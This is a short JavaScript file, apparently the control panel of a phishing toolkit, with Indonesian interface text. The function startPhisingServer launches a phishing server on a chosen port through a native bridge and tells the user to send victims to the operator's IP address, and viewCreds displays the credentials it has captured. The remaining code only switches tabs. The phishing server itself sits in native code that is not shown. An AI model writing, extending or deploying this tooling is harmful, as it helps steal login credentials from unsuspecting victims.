function startPhisingServer() {
  var port = document.getElementById('ph-port').value || 8080;
  if (window.Native && window.Native.startServer) {
    window.Native.startServer(port);
    document.getElementById('ph-output').textContent = 'Server jalan di port ' + port + '\nAkses dari browser: http://IP-KAMU:' + port;
  } else {
    document.getElementById('ph-output').textContent = 'Native bridge gak tersedia. Server cuma bisa jalan di Java shell.';
  }
}

function viewCreds() {
  if (window.Native && window.Native.readCreds) {
    var creds = window.Native.readCreds();
    document.getElementById('ph-output').textContent = creds || 'Belum ada creds masuk';
  } else {
    document.getElementById('ph-output').textContent = 'Native bridge gak tersedia.';
  }
}

var tabs = document.querySelectorAll('.tab');
for (var i = 0; i < tabs.length; i++) {
  tabs[i].onclick = function() {
    for (var j = 0; j < tabs.length; j++) {
      tabs[j].classList.remove('active');
      document.getElementById('panel-' + tabs[j].getAttribute('data-panel')).classList.remove('active');
    }
    this.classList.add('active');
    document.getElementById('panel-' + this.getAttribute('data-panel')).classList.add('active');
  };
}
